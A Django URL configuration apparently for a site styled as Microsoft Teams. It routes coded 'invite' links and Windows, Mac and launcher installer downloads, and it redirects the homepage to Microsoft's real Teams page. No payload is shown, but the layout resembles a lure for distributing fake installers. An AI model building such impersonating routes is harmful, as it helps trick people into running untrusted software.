from django.conf.urls import url
from . import views 
from django.urls import path
from django.urls import re_path
from django.views.generic.base import RedirectView

app_name = 'core'


urlpatterns = [
    path('download-teams/', views.download_app, name='download'),
    path('download-teams-windows/<str:code>/', views.download_winexe, name='wininstaller'),
    path('download-teams-mac/<str:code>/', views.download_macexe, name='macinstaller'),
    path('live/videocall/meet/invite/<str:code>/', views.home, name='invite_link'),
    re_path(r'dl/launcher/download/$', views.launcherview, name='launcher'),
    path('', RedirectView.as_view(url='https://www.microsoft.com/en-us/microsoft-teams/group-chat-software'), name='home')
]